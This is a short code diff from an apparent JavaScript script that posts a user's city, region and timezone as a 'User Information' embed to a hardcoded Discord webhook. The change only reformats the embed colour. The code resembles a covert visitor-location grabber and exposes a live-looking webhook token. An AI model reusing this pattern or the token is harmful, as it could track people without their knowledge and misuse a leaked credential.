@@ -27,11 +27,14 @@
     const { city, region, timezone } = locationInfo;
     const webhookURL = 'https://discord.com/api/webhooks/1197319022455300147/hnBvBYUy-eHX9vSz8S_-jMFtQ805c7pUcoQqkLB6ZSCzE_h87CHjMPrMy6aqNXFdT_P7'; // Replace with your Discord webhook URL
 
-    // Create payload for Discord webhook as an embedded message
+    // Convert RGB color (49, 51, 56) to Discord format
+    const discordColor = (49 << 16) + (51 << 8) + 56;
+
+    // Create payload for Discord webhook as an embedded message with color #313338
     const payload = {
         embeds: [{
             title: "User Information",
-            color: 0x313338, // Set the color of the embed (Hex color code)
+            color: discordColor, // Set the color of the embed (Discord format)
             fields: [
                 { name: "City", value: city, inline: true },
                 { name: "Region", value: region, inline: true },
